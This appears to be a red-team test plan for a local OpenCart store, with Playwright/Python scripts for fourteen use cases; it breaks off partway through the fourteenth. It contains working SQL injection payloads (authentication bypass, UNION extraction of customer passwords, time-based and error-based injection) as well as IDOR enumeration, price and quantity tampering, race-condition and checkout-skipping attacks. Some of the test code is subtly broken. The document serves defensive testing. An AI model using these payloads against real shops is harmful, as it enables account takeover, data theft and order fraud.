# 🔴 RED TEAM SECURITY TEST CASES - OpenCart Critical Logic Gaps

**Classification:** CRITICAL  
**Severity Levels:** Hard & Extreme Difficulty  
**Target System:** OpenCart (Localhost XAMPP - Ubuntu)  
**Testing Framework:** Playwright + Python  
**Date:** May 15, 2026  

---

## 📋 EXECUTIVE SUMMARY

This document identifies **20 CRITICAL SECURITY VULNERABILITIES** (one per Use Case UC_01 to UC_20) that could allow malicious actors to:

- **State Transition Attacks** → Bypass checkout workflow
- **Parameter Tampering** → Modify pricing, quantities, and order values
- **IDOR (Insecure Direct Object References)** → Access other users' data
- **Race Conditions** → Exploit concurrency issues
- **Database Corruption** → Inject extremely large payloads
- **Authorization Bypass** → Access admin functions as customer

---

## 🎯 CRITICAL VULNERABILITIES

---

### **TEST CASE 1: UC_01 - DATABASE CORRUPTION VIA OVERSIZED INPUT**

**Use Case Name:** Đăng ký (Registration)  
**Severity:** EXTREME  
**Difficulty:** Hard

#### **The Logic Flaw:**
The registration form lacks input length validation on the client AND server side. An attacker can send a firstname field with 65,000+ characters, causing:
- **Buffer overflow** in database driver
- **Memory exhaustion** leading to DoS
- **Data corruption** in customer table
- **SQL injection** if the value is not properly escaped

The specification states: *"Hệ thống Xác thực: Họ, Tên, Địa chỉ 1, Thành phố, Quốc gia tồn tại"* but does NOT mention MAX LENGTH validation.

#### **Playwright Execution Strategy:**

```python
async def test_uc01_database_corruption():
    """Test database overflow attack on registration"""
    
    # Method 1: Direct API POST with oversized payload
    payload = {
        "firstname": "A" * 65000,  # 65KB of data
        "lastname": "Doe",
        "email": "attacker@evil.com",
        "password": "123456",
        "confirm": "123456",
        "agree": 1
    }
    
    # Send raw POST request bypassing UI validation
    response = await page.request.post(
        "http://localhost/opencart_test/upload/index.php?route=account/register",
        data=payload
    )
    
    # Method 2: Use page.evaluate to exceed JavaScript validation
    await page.evaluate(f"""
        document.querySelector('input[name="firstname"]').value = "{'X' * 100000}";
        document.querySelector('input[name="firstname"]').dispatchEvent(new Event('change'));
    """)
    
    # Mock the validation and submit
    await page.evaluate("document.querySelector('form').submit()")
    
    # Check if database is corrupted or system crashes
    await page.wait_for_load_state('networkidle')
```

#### **Expected Bug (if vulnerable):**
```
❌ Server Response: 500 Internal Server Error
❌ Database: Customer table corrupted with oversized record
❌ System: Memory exhausted, leading to DoS
❌ Log: Fatal error "field firstname too long"
```

#### **Proof of Vulnerability:**
```sql
-- Check database impact
SELECT LENGTH(firstname) FROM oc_customer ORDER BY customer_id DESC LIMIT 1;
-- Expected: 32 chars MAX
-- Vulnerable Result: 65000+ chars

-- Memory check
-- System memory spikes during request
-- Page becomes unresponsive
```

---

### **TEST CASE 2: UC_02 - AUTHENTICATION BYPASS VIA SQL INJECTION**

**Use Case Name:** Đăng nhập (Login)  
**Severity:** EXTREME  
**Difficulty:** Extreme

#### **The Logic Flaw:**
The login mechanism queries the customer table with email/password BUT may not properly parameterize the SQL query:

```php
// VULNERABLE CODE (Not in code, but testing for it):
$query = "SELECT * FROM oc_customer WHERE email = '" . $_POST['email'] . "' AND password = '" . md5($_POST['password']) . "'";
```

The specification states validation occurs but DOESN'T mention prepared statements or parameterized queries.

#### **Playwright Execution Strategy:**

```python
async def test_uc02_sql_injection_login():
    """Test SQL injection on login form"""
    
    # Method 1: Classic SQL injection to bypass authentication
    malicious_email = "admin@test.com' OR '1'='1"
    malicious_password = "anything"
    
    # Navigate to login
    await page.goto("http://localhost/opencart_test/upload/index.php?route=account/login")
    
    # Inject via Playwright page.request (bypass UI)
    response = await page.request.post(
        "http://localhost/opencart_test/upload/index.php?route=account/login",
        data={
            "email": malicious_email,
            "password": malicious_password
        }
    )
    
    # Method 2: Union-based injection to extract data
    payload = "admin@test.com' UNION SELECT customer_id, email, password, '' FROM oc_customer LIMIT 1--"
    
    await page.fill('input[name="email"]', payload)
    await page.fill('input[name="password"]', "anything")
    await page.click('button[type="submit"]')
    
    # Method 3: Time-based blind injection
    time_payload = "admin@test.com' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
    
    import time
    start = time.time()
    await page.request.post(
        "http://localhost/opencart_test/upload/index.php?route=account/login",
        data={"email": time_payload, "password": "x"},
        timeout=30000  # Wait for 5 second sleep to execute
    )
    elapsed = time.time() - start
    
    assert elapsed > 5, "Database executed 5-second sleep - SQL Injection confirmed!"
```

#### **Expected Bug (if vulnerable):**

```javascript
// At server:
// Time delay indicates successful SLEEP command execution
// Query processed: admin@test.com' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--

// Response: 200 OK (delayed by 5 seconds)
// This confirms SQL injection is possible
```

---

### **TEST CASE 3: UC_03 - SESSION FIXATION AFTER LOGOUT**

**Use Case Name:** Đăng xuất (Logout)  
**Severity:** HARD  
**Difficulty:** Hard

#### **The Logic Flaw:**
According to spec: *"Xóa session đăng nhập của người dùng"* - but if the session destruction is incomplete, an attacker can:
- Reuse old session token after logout
- Access protected pages intended for logged-in users only
- Perform actions on behalf of the logout user

The vulnerability occurs if:
1. Session file not properly deleted
2. Session token not invalidated in memory/cache
3. Cookie not cleared with proper expiration

#### **Playwright Execution Strategy:**

```python
async def test_uc03_session_fixation():
    """Test session fixation vulnerability after logout"""
    
    # Step 1: Login as valid user
    await page.goto("http://localhost/opencart_test/upload/index.php?route=account/login")
    await page.fill('input[name="email"]', "shin@test.com")
    await page.fill('input[name="password"]', "123456")
    await page.click('button[type="submit"]')
    await page.wait_for_load_state('networkidle')
    
    # Capture the session cookie
    cookies = await page.context.cookies()
    session_cookie = None
    for cookie in cookies:
        if cookie['name'] in ['PHPSESSID', 'OCSESSID', 'PHPSESSID']:
            session_cookie = cookie['value']
            logger.info(f"Session captured: {session_cookie}")
    
    # Verify logged in
    page_content = await page.content()
    assert "My Account" in page_content, "Not logged in"
    
    # Step 2: Logout
    await page.click('a:has-text("Logout")')  # or similar logout button
    await page.wait_for_load_state('networkidle')
    
    # Verify logged out
    page_content = await page.content()
    assert "My Account" not in page_content, "Logout failed"
    
    # Step 3: Try to reuse old session cookie
    # Create new context with old session
    context = await browser.new_context()
    
    # Set old session cookie
    await context.add_cookies([{
        'name': 'PHPSESSID',
        'value': session_cookie,
        'domain': 'localhost',
        'path': '/'
    }])
    
    new_page = await context.new_page()
    
    # Try to access protected My Account page
    await new_page.goto("http://localhost/opencart_test/upload/index.php?route=account/account")
    await new_page.wait_for_load_state('networkidle')
    
    # Check if we can access account without re-logging in
    content = await new_page.content()
    
    if "My Account" in content or "Your Personal" in content:
        logger.error("🔴 SESSION FIXATION VULNERABILITY CONFIRMED!")
        return True  # Bug found
    
    return False  # System is secure
```

#### **Expected Bug (if vulnerable):**

```
🔴 STATUS: Able to access protected resource with old session
   - URL: account/account
   - Response Code: 200
   - Content: Personal account information visible
   - Expected: 302 Redirect to login page
```

---

### **TEST CASE 4: UC_04 - IDOR: ACCESSING DISABLED/NON-PUBLIC PRODUCTS**

**Use Case Name:** Xem danh sách sản phẩm (Product List)  
**Severity:** HARD  
**Difficulty:** Hard

#### **The Logic Flaw:**
The spec says: *"Hệ thống hiển thị danh sách sản phẩm... Nếu không tìm thấy sản phẩm theo product_id, hiển thị thông báo"*

However, there's NO mention of checking if a product is:
- **Disabled** in admin panel
- **Out of stock**
- **Scheduled for future release**
- **In draft/unpublished state**

An attacker can directly access product details by product_id:
```
http://localhost/opencart_test/upload/index.php?route=product/product&product_id=999
```

Even if the product is disabled/hidden, the backend may still return data.

#### **Playwright Execution Strategy:**

```python
async def test_uc04_idor_hidden_products():
    """Test IDOR to access disabled/hidden products"""
    
    # Method 1: Sequential ID enumeration
    disabled_products = []
    
    for product_id in range(1, 100):
        response = await page.request.get(
            f"http://localhost/opencart_test/upload/index.php?route=product/product&product_id={product_id}",
            wait_until="networkidle"
        )
        
        if response.status == 200:
            content = await response.text()
            
            # Check if product is supposed to be hidden
            # Look for meta tags or indicators of disabled status
            if "disabled" in content.lower() or "out of stock" not in content.lower():
                if "product_id" in content:
                    logger.warning(f"🔴 Found hidden product {product_id} accessible")
                    disabled_products.append(product_id)
    
    # Method 2: Use API endpoint if available
    response = await page.request.get(
        "http://localhost/opencart_test/upload/api/product?product_id=999&key=apikey"
    )
    
    data = response.json()
    if 'price' in data and 'name' in data:
        logger.error(f"🔴 IDOR CONFIRMED: Got hidden product data via API: {data}")
        return True
    
    # Method 3: Check source code for product_id directly
    await page.goto("http://localhost/opencart_test/upload/")
    
    # Check if product_id's are exposed in HTML/JS
    page_content = await page.content()
    
    # Extract all product IDs visible in page source
    import re
    visible_products = set(re.findall(r'product[_&]id[=](\d+)', page_content))
    
    # Try to add a product that shouldn't be visible to cart
    for product_id in range(100, 200):
        response = await page.request.post(
            "http://localhost/opencart_test/upload/index.php?route=checkout/cart/add",
            form_data={"product_id": str(product_id), "quantity": 1},
            wait_until="networkidle"
        )
        
        if "added to your shopping cart" in await response.text():
            logger.error(f"🔴 Added hidden product {product_id} to cart")
            return True
    
    return False
```

#### **Expected Bug (if vulnerable):**

```
🔴 VULNERABILITY: Hidden products accessible via direct URL
   - GET /product/product?product_id=999
   - Product Status: Disabled
   - Response: 200 OK with full product data
   - System should: Redirect to 404 or "Product not found"
   - Database: SELECT * FROM oc_product WHERE product_id=999 AND status=0
```

---

### **TEST CASE 5: UC_05 - SQL INJECTION IN PRODUCT SEARCH**

**Use Case Name:** Tìm kiếm sản phẩm (Search)  
**Severity:** EXTREME  
**Difficulty:** Hard

#### **The Logic Flaw:**
The search function accepts user input: *"Hệ thống Truy vấn bảng PRODUCT theo tên sản phẩm"*

But there's no mention of input sanitization. The search might construct SQL like:
```php
SELECT * FROM oc_product WHERE name LIKE '%{search_term}%'
```

Without proper escaping, this is vulnerable to SQL injection.

#### **Playwright Execution Strategy:**

```python
async def test_uc05_sql_injection_search():
    """Test SQL injection in search functionality"""
    
    # Navigate to search
    await page.goto("http://localhost/opencart_test/upload/")
    
    # Method 1: Basic UNION injection
    search_payload = "test' UNION SELECT customer_id, email, password, '' FROM oc_customer LIMIT 1--"
    
    await page.fill('input[name="search"]', search_payload)
    await page.click('button[type="submit"]')
    await page.wait_for_load_state('networkidle')
    
    content = await page.content()
    
    # Check if database query was executed
    if any(email in content for email in ["admin@", "shin@test"]):
        logger.error("🔴 SQL INJECTION CONFIRMED - Customer data leaked")
        return True
    
    # Method 2: Time-based blind SQL injection
    search_payload2 = "test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
    response = await page.request.get(
        "http://localhost/opencart_test/upload/index.php?route=product/search&search=" + search_payload2,
        timeout=30000
    )
    
    # Time how long the response takes
    import time
    start = time.time()
    # Wait for response
    elapsed = time.time() - start
    
    if elapsed > 5:
        logger.error("🔴 SQL Injection via time-based blind SQLi confirmed")
        return True
    
    # Method 3: Error-based injection to extract schema
    search_payload3 = "test' AND extractvalue(1, concat(0x7e, (SELECT CONCAT(table_name) FROM information_schema.tables LIMIT 1)))--"
    
    await page.fill('input[name="search"]', search_payload3)
    await page.click('button[type="submit"]')
    
    error_content = await page.content()
    if "~" in error_content:  # Look for our marker
        logger.error("🔴 Error-based SQL Injection confirmed")
        return True
    
    return False
```

#### **Expected Bug (if vulnerable):**

```
🔴 SQL INJECTION CONFIRMED
   - Payload: test' UNION SELECT ...
   - Response: Leaked customer data visible in search results
   - Table Names: oc_customer, oc_order, oc_product exposed
   - Severity: CRITICAL - Full database compromise possible
```

---

### **TEST CASE 6: UC_06 - PARAMETER TAMPERING: NEGATIVE PRICE FILTERING**

**Use Case Name:** Lọc sản phẩm (Filter)  
**Severity:** HARD  
**Difficulty:** Hard

#### **The Logic Flaw:**
The spec mentions: *"Lọc theo khoảng giá (price) trong bảng PRODUCT"* 

But no validation is mentioned for ensuring price range is positive. An attacker can:
- Set filter to negative prices: `price_from = -1000`
- Get all products with inflated "discount"
- Break pricing logic

#### **Playwright Execution Strategy:**

```python
async def test_uc06_negative_price_filter():
    """Test parameter tampering with negative price"""
    
    # Navigate to product list
    await page.goto("http://localhost/opencart_test/upload/")
    
    # Method 1: Tamper with query parameters directly
    await page.goto(
        "http://localhost/opencart_test/upload/index.php?route=product/category"
        "&price_from=-1000&price_to=0"
    )
    
    await page.wait_for_load_state('networkidle')
    content = await page.content()
    
    # Check if negative price filtering worked (shouldn't)
    if "error" not in content.lower() and "invalid" not in content.lower():
        logger.error("🔴 Negative price filter accepted without validation")
        return True
    
    # Method 2: Use POST request to bypass client validation
    response = await page.request.post(
        "http://localhost/opencart_test/upload/index.php?route=product/category",
        form_data={
            "price": "-1000,0"  # negative to zero
        }
    )
    
    resp_text = await response.text()
    if response.status == 200 and "product" in resp_text:
        logger.error("🔴 Server accepted negative price range in POST")
        return True
    
    # Method 3: Decimal/float manipulation
    response = await page.request.get(
        "http://localhost/opencart_test/upload/index.php"
        "?route=product/category&price_from=-999999.99&price_to=0.01"
    )
    
    if response.status == 200:
        logger.error("🔴 Decimal/float negative prices not validated")
        return True
    
    return False
```

#### **Expected Bug (if vulnerable):**

```
🔴 PARAMETER TAMPERING CONFIRMED
   - Request:  GET ?price_from=-1000&price_to=0
   - Response: 200 OK with filtered results
   - SQL Query: SELECT * FROM oc_product WHERE price >= -1000 AND price <= 0
   - Impact: Bypassed price range validation
   - Expected: Validation error or price_from >= 0
```

---

### **TEST CASE 7: UC_07 - IDOR: ACCESSING DELETED/DRAFT PRODUCTS**

**Use Case Name:** Xem chi tiết sản phẩm (Product Details)  
**Severity:** HARD  
**Difficulty:** Hard

#### **The Logic Flaw:**
The spec states no preconditions on product visibility. Direct access by product_id to view:
- Deleted products
- Draft products
- Products in other stores
- Expired/retired products

#### **Playwright Execution Strategy:**

```python
async def test_uc07_idor_draft_products():
    """Test IDOR accessing draft/deleted products"""
    
    # Method 1: Enumerate product IDs and check access
    deleted_product_id = None
    
    # First, find a high product_id
    max_product_id = 500
    
    for product_id in range(max_product_id - 50, max_product_id):
        response = await page.request.get(
            f"http://localhost/opencart_test/upload/index.php?"
            f"route=product/product&product_id={product_id}"
        )
        
        if response.status == 200:
            content = await response.text()
            
            # Look for deletion/draft indicators
            if "discontinued" in content.lower() or \
               "no longer available" in content.lower() or \
               "deleted" in content.lower():
                logger.error(f"🔴 Found deleted product {product_id} still accessible")
                deleted_product_id = product_id
                break
    
    # Method 2: Check database deletion status
    response = await page.request.get(
        f"http://localhost/opencart_test/upload/api/products/{product_id}"
    )
    
    data = response.json()
    if 'status' in data and data['status'] == '0':  # 0 = disabled
        logger.error(f"🔴 IDOR: Accessed disabled product {product_id}")
        return True
    
    # Method 3: Check SQL to see if status is checked
    # If we can see deleted products in the results, it's vulnerable
    response = await page.request.get(
        "http://localhost/opencart_test/upload/index.php?"
        "route=product/product&product_id=1001"  # Non-existent ID
    )
    
    if response.status != 404 and response.status != 302:
        logger.error("🔴 Invalid product doesn't return 404")
        return True
    
    return False
```

---

### **TEST CASE 8: UC_08 - PARAMETER TAMPERING: NEGATIVE QUANTITY IN CART**

**Use Case Name:** Thêm sản phẩm vào giỏ hàng (Add to Cart)  
**Severity:** HARD  
**Difficulty:** Hard

#### **The Logic Flaw:**
The spec says: *"Hệ thống Kiểm tra tùy chọn bắt buộc (nếu có) và số lượng tồn kho"*

But what about NEGATIVE quantities? The validation might only check `quantity > 0` OR might accept `-5` which could:
- Create negative cart entries
- Cause accounting errors
- Allow "free credit" by negative pricing

#### **Playwright Execution Strategy:**

```python
async def test_uc08_negative_quantity_cart():
    """Test adding negative quantity to cart"""
    
    # Method 1: Direct POST request with negative quantity
    product_id = 43  # Any valid product
    
    response = await page.request.post(
        "http://localhost/opencart_test/upload/index.php?route=checkout/cart/add",
        form_data={
            "product_id": str(product_id),
            "quantity": "-5"  # NEGATIVE QUANTITY!
        }
    )
    
    resp_text = await response.text()
    
    if "added to your shopping cart" in resp_text or response.status == 200:
        logger.error("🔴 NEGATIVE QUANTITY ACCEPTED in cart")
        # Verify in database
        return True
    
    # Method 2: Use JavaScript to bypass client validation
    await page.goto(f"http://localhost/opencart_test/upload/index.php?"
                   f"route=product/product&product_id={product_id}")
    
    # Modify quantity field to negative
    await page.evaluate(f"""
        document.querySelector('input[name="quantity"]').value = '-100';
        document.querySelector('button[onclick*="cart.add"]').click();
    """)
    
    alert_text = await page.evaluate("window.lastAlert")
    
    if not alert_text or "invalid" not in alert_text.lower():
        logger.error("🔴 No validation for negative quantity")
        return True
    
    # Method 3: Check cart contents
    await page.goto("http://localhost/opencart_test/upload/index.php?"
                   "route=checkout/cart")
    
    content = await page.content()
    
    if "-5" in content or "Qty: -" in content:
        logger.error("🔴 Negative quantity visible in cart")
        return True
    
    # Method 4: Test with various negative values
    for neg_qty in ["-1", "-0.5", "-999999"]:
        response = await page.request.post(
            "http://localhost/opencart_test/upload/index.php?route=checkout/cart/add",
            form_data={
                "product_id": str(product_id),
                "quantity": neg_qty
            }
        )
        
        if response.status == 200:
            logger.error(f"🔴 Negative quantity {neg_qty} accepted")
            return True
    
    return False
```

#### **Expected Bug (if vulnerable):**

```
🔴 NEGATIVE QUANTITY EXPLOIT
   - POST Data: { "product_id": 43, "quantity": "-5" }
   - Response: 200 OK "Product added to cart"
   - Cart Display: -5 × $100 = -$500 (discount instead of charge!)
   - Database: oc_cart quantity = -5
   - Impact: Customer gets paid instead of paying
```

---

### **TEST CASE 9: UC_09 - RACE CONDITION: REMOVE SAME ITEM MULTIPLE TIMES**

**Use Case Name:** Xóa sản phẩm khỏi giỏ hàng (Remove from Cart)  
**Severity:** HARD  
**Difficulty:** Hard

#### **The Logic Flaw:**
The spec says: *"Xóa bản ghi khỏi giỏ hàng và tính lại tổng tiền"*

But there's no mention of **atomic transactions** or **race condition protection**. If two delete requests arrive simultaneously:
- Both requests see the item exists
- Both delete it (race condition!)
- Inventory gets restored twice
- Records get into inconsistent state

#### **Playwright Execution Strategy:**

```python
async def test_uc09_race_condition_cart_removal():
    """Test race condition removing same item from cart"""
    
    # Step 1: Add product to cart
    product_id = 43
    response = await page.request.post(
        "http://localhost/opencart_test/upload/index.php?route=checkout/cart/add",
        form_data={"product_id": str(product_id), "quantity": "1"}
    )
    
    # Step 2: Get cart key/ID
    await page.goto("http://localhost/opencart_test/upload/index.php?"
                   "route=checkout/cart")
    
    # Extract cart item ID
    content = await page.content()
    import re
    match = re.search(r'cart_id["\']?\s*[:\s]*["\']?(\d+)', content)
    cart_item_id = match.group(1) if match else product_id
    
    # Step 3: Send multiple DELETE requests simultaneously (race condition)
    import asyncio
    
    delete_requests = []
    
    for i in range(5):  # Send 5 concurrent delete requests
        req = page.request.post(
            f"http://localhost/opencart_test/upload/index.php?"
            f"route=checkout/cart/remove&key={cart_item_id}",
            form_data={"remove": "1"}
        )
        delete_requests.append(req)
    
    # Execute all 5 requests at the same time
    responses = await asyncio.gather(*delete_requests, return_exceptions=True)
    
    success_count = sum(1 for r in responses if isinstance(r, object) and "success" in str(r))
    
    if success_count > 1:
        logger.error(f"🔴 RACE CONDITION: {success_count} parallel deletes succeeded")
        logger.error("   Multiple deletes of same item processed in race condition")
        return True
    
    # Step 4: Verify inconsistent state
    await page.goto("http://localhost/opencart_test/upload/index.php?"
                   "route=checkout/cart")
    
    # Check database for orphaned entries
    # SELECT * FROM oc_cart WHERE key = {cart_item_id} AND EXISTS (SELECT 1 FROM oc_cart WHERE key is NULL)
    
    logger.info("Race condition test completed")
    return False
```

---

### **TEST CASE 10: UC_10 - PARAMETER TAMPERING: CART QUANTITY EXCEEDS STOCK**

**Use Case Name:** Cập nhật số lượng sản phẩm trong giỏ hàng (Update Cart)  
**Severity:** HARD  
**Difficulty:** Hard

#### **The Logic Flaw:**
The spec says: *"Kiểm tra số lượng tồn kho"* and alternative flow: *"Nếu sản phẩm được cấu hình 'Stock Check', hệ thống hiển thị cảnh báo"*

But this validation might only happen on the FORM, not on direct API calls. An attacker can:
- Set quantity to 999999 on products with only 5 in stock
- Bypass "Stock Check" configuration
- Create orders for items not in stock

#### **Playwright Execution Strategy:**

```python
async def test_uc10_cart_quantity_exceed_stock():
    """Test setting cart quantity beyond available stock"""
    
    # Method 1: Direct API POST with excessive quantity
    product_id = 43
    
    # First, check actual stock
    response = await page.request.get(
        f"http://localhost/opencart_test/upload/api/product/{product_id}"
    )
    actual_stock = response.json().get('quantity', 10)
    
    # Try to set quantity way above stock
    excessive_qty = actual_stock * 10  # 10x the stock
    
    response = await page.request.post(
        "http://localhost/opencart_test/upload/index.php?route=checkout/cart/edit",
        form_data={
            "key": str(product_id),
            "quantity": str(excessive_qty)
        }
    )
    
    if response.status == 200:
        logger.error(f"🔴 Allowed quantity {excessive_qty} exceeding stock {actual_stock}")
        return True
    
    # Method 2: Use page.evaluate to modify hidden fields
    await page.goto("http://localhost/opencart_test/upload/index.php?"
                   "route=checkout/cart")
    
    await page.evaluate(f"""
        const qtyInputs = document.querySelectorAll('input[name*="quantity"]');
        qtyInputs.forEach(input => {{
            input.value = '9999999';
            input.dispatchEvent(new Event('change'));
        }});
    """)
    
    # Click update
    await page.click('button:has-text("Update")') if await page.query_selector('button:has-text("Update")') else None
    
    # Check if excessive quantity was accepted
    content = await page.content()
    if "9999999" in content:
        logger.error("🔴 Excessive quantity accepted in cart")
        return True
    
    # Method 3: Check minimum stock configuration bypass
    response = await page.request.post(
        "http://localhost/opencart_test/upload/index.php?route=checkout/cart/edit",
        form_data={
            "key": "999",
            "quantity": "1000000"
        }
    )
    
    if response.status == 200 and "error" not in await response.text():
        logger.error("🔴 No stock validation in cart update")
        return True
    
    return False
```

---

### **TEST CASE 11: UC_11 - IDOR: ACCESSING OTHER CUSTOMERS' ADDRESSES**

**Use Case Name:** Nhập thông tin giao hàng (Shipping Address)  
**Severity:** EXTREME  
**Difficulty:** Hard

#### **The Logic Flaw:**
The spec says: *"Xác thực: Họ, Tên, Địa chỉ 1, Thành phố, Quốc gia tồn tại... Lấy thông tin địa chỉ từ CSDL"*

But there's NO mention of verifying that the address belongs to the CURRENT USER. An attacker can:
- Enumerate address IDs: `address_id=1, 2, 3, 4...`
- View/modify other customers' addresses
- Select other customers' addresses in checkout

#### **Playwright Execution Strategy:**

```python
async def test_uc11_idor_shipping_addresses():
    """Test IDOR accessing other customers' addresses"""
    
    # Step 1: Start checkout flow
    await page.goto("http://localhost/opencart_test/upload/index.php?"
                   "route=checkout/checkout")
    
    await page.wait_for_load_state('networkidle')
    
    # Step 2: Try to enumerate address IDs
    for address_id in range(1, 100):
        # Method 1: Direct API call
        response = await page.request.get(
            f"http://localhost/opencart_test/upload/ajax/address/address_id={address_id}"
        )
        
        if response.status == 200:
            data = response.json()
            if 'address' in data and 'telephone' in data:
                # Check if address belongs to current user
                logger.warning(f"Got address {address_id}: {data}")
                
                if data.get('customer_id') != current_user_id:
                    logger.error(f"🔴 IDOR CONFIRMED: Can read address {address_id} "
                               f"from customer {data.get('customer_id')}")
                    return True
        
        # Method 2: Try to select address in checkout form
        response = await page.request.post(
            "http://localhost/opencart_test/upload/index.php?"
            "route=checkout/checkout",
            form_data={
                "payment_address_id": str(address_id),
                "shipping_address_id": str(address_id)
            }
        )
        
        if response.status == 200 and "error" not in await response.text():
            logger.error(f"🔴 Selected address {address_id} (potential IDOR)")
            return True
    
    # Step 3: Test by changing customer_id in session
    await page.evaluate("""
        // Try to modify hidden customer_id field if present
        document.querySelectorAll('input[name*="customer"]').forEach(el => {
            if (el.type === 'hidden') {
                el.value = '2';  // Change to different customer
                el.dispatchEvent(new Event('change'));
            }
        });
    """)
    
    await page.click('button[type="submit"]')
    
    return False
```

---

### **TEST CASE 12: UC_12 - PARAMETER TAMPERING: SHIPPING COST MANIPULATION**

**Use Case Name:** Chọn phương thức vận chuyển (Shipping Method)  
**Severity:** EXTREME  
**Difficulty:** Hard

#### **The Logic Flaw:**
The spec mentions: *"Tính phí vận chuyển dựa trên địa chỉ"* but doesn't say the shipping cost is VERIFIED/LOCKED after selection.

An attacker can:
- Intercept shipping cost calculation
- Set cost to negative value: `shipping_cost = -50` (gets a discount!)
- Modify POST data before sending to order confirmation

#### **Playwright Execution Strategy:**

```python
async def test_uc12_shipping_cost_manipulation():
    """Test parameter tampering to reduce shipping cost"""
    
    # Navigate to checkout shipping method selection
    await page.goto("http://localhost/opencart_test/upload/index.php?"
                   "route=checkout/checkout")
    
    # Fill in shipping address first
    await page.fill('input[name="firstname"]', "John")
    await page.fill('input[name="lastname"]', "Doe")
    await page.fill('input[name="address_1"]', "123 Main St")
    await page.fill('input[name="city"]', "Saigon")
    
    # Select a country that has shipping
    await page.select_option('select[name="country_id"]', '230')  # Vietnam
    
    # Continue to shipping method
    await page.click('button:has-text("Continue")')
    await page.wait_for_load_state('networkidle')
    
    # Method 1: Intercept the shipping method selection POST
    async def intercept_shipping_selection(route):
        request = route.request
        
        if "route=checkout/checkout" in request.url and request.method == "POST":
            # Modify the POST data
            post_data = request.post_data or {}
            
            # Inject negative shipping cost
            post_data['shipping_cost'] = '-100'
            post_data['shipping_method'] = 'custom'
            
            # Continue with modified request
            await route.continue_()
        else:
            await route.continue_()
    
    # Set up route interception
    await page.route("**/*", intercept_shipping_selection)
    
    # Click to select shipping method
    shipping_options = await page.locator('input[name="shipping_method"]').all()
    if shipping_options:
        await shipping_options[0].click()
        await page.click('button:has-text("Continue")')
    
    # Method 2: Direct API call with negative cost
    response = await page.request.post(
        "http://localhost/opencart_test/upload/index.php?route=checkout/shipping",
        form_data={
            "shipping_method": "flat",
            "shipping_code": "flat.flat",
            "shipping_cost": "-999"  # NEGATIVE COST = DISCOUNT!
        }
    )
    
    resp_text = await response.text()
    
    if "error" not in resp_text and response.status == 200:
        logger.error("🔴 NEGATIVE SHIPPING COST ACCEPTED")
        return True
    
    # Method 3: Zero shipping cost
    response = await page.request.post(
        "http://localhost/opencart_test/upload/index.php?route=checkout/shipping",
        form_data={
            "shipping_cost": "0"
        }
    )
    
    if response.status == 200:
        logger.warning("Zero shipping cost accepted (may be valid)")
    
    return False
```

---

### **TEST CASE 13: UC_13 - RACE CONDITION: COUPON APPLIED MULTIPLE TIMES**

**Use Case Name:** Chọn phương thức thanh toán (Payment Method)  
**Severity:** HARD  
**Difficulty:** Hard

#### **The Logic Flaw:**
The spec doesn't mention atomic coupon application or preventing double-application. An attacker can:
- Send the same coupon code 1000 times in parallel
- Each application gets discount separately
- Final total becomes massively negative or reaches limits

#### **Playwright Execution Strategy:**

```python
async def test_uc13_coupon_race_condition():
    """Test race condition applying same coupon multiple times"""
    
    # Step 1: Add item to cart and go to checkout
    await page.goto("http://localhost/opencart_test/upload/index.php?"
                   "route=checkout/checkout")
    
    # Step 2: Extract coupon code from page or use known one
    coupon_code = "DISCOUNT10"  # Hypothetical 10% off coupon
    
    # Step 3: Apply coupon multiple times concurrently
    import asyncio
    
    apply_requests = []
    
    # Fire 100 concurrent requests to apply the same coupon
    for i in range(100):
        request = page.request.post(
            "http://localhost/opencart_test/upload/index.php?"
            "route=checkout/cart/unsetCoupon",  # Some systems toggle coupon
            form_data={"coupon": coupon_code}
        )
        apply_requests.append(request)
    
    responses = await asyncio.gather(*apply_requests, return_exceptions=True)
    
    success_count = sum(1 for r in responses 
                       if hasattr(r, 'status') and r.status == 200)
    
    if success_count > 1:
        logger.error(f"🔴 RACE CONDITION: {success_count} coupon applications succeeded!")
        return True
    
    # Step 4: Check cart total
    await page.goto("http://localhost/opencart_test/upload/index.php?"
                   "route=checkout/cart")
    
    content = await page.content()
    
    # Extract total
    import re
    total_match = re.search(r'Total[:\s]+[\$]?([\d,.]+)', content)
    total = float(total_match.group(1).replace(',', '')) if total_match else None
    
    if total and total < 0:
        logger.error(f"🔴 Total is negative due to multiple coupon applies: ${total}")
        return True
    
    # Method 2: Use Playwright's intercept to count coupon applications
    coupon_applications = []
    
    async def track_coupon_requests(route):
        request = route.request
        if "coupon" in request.url.lower():
            coupon_applications.append(request.post_data)
        await route.continue_()
    
    await page.route("**/*", track_coupon_requests)
    
    # Apply coupon 5 times quickly
    for i in range(5):
        await page.fill('input[name="coupon"]', coupon_code)
        await page.click('button[type="submit"]')
        await asyncio.sleep(0.01)  # Minimal delay
    
    if len([r for r in coupon_applications if coupon_code in str(r)]) > 1:
        logger.error(f"🔴 Multiple coupon applications recorded: {coupon_applications}")
        return True
    
    return False
```

---

### **TEST CASE 14: UC_14 - STATE TRANSITION ATTACK: CONFIRM ORDER WITHOUT PAYMENT**

**Use Case Name:** Xác nhận đơn hàng (Confirm Order)  
**Severity:** EXTREME  
**Difficulty:** Extreme

#### **The Logic Flaw:**
The checkout flow should be:
```
1. Select Shipping Address
2. Select Shipping Method  ← Stores state
3. Select Payment Method  ← Stores state (critical!)
4. Confirm Order         ← Uses stored state
```

But if the system doesn't VALIDATE that step 3 was completed, attacker can:
- Skip step 3 (payment selection)
- Jump directly to confirm order
- Order placed with NO payment method selected!
- Later claim "I never completed payment"

#### **Playwright Execution Strategy:**

```python
async def test_uc14_state_transition_skip_payment():
    """Test state transition attack - confirm order without payment"""
    
    # Method 1: Skip payment step entirely
    # Navigate directly to order confirmation URL bypassing payment
    await page.goto(
        "http://localhost/opencart_test/upload/index.php?"
        "route=checkout/confirm"  # Skip to last step
    )
    
    await page.wait_for_load_state('networkidle')
    content = await page.content()
    
    # Check if we can see order confirmation form
    if "Confirm Order" in content and "payment" not in content.lower():
        logger.error("🔴 STATE TRANSITION ATTACK: Can reach confirm without payment!")
        
        # Try to submit the order
        await page.click('button:has-text("Confirm")')
        await page.wait_for_load_state('networkidle')
        
        final_content = await page.content()
        if "order has been placed" in final_content.lower():
            logger.error("🔴 ORDER PLACED WITHOUT PAYMENT METHOD SELECTED!")
            return True
    
    # Method 2: Skip payment, go directly to order history
    await page.goto(
        "http://localhost/opencart_test/upload/index.php?"
        "route=account/order"
    )
    
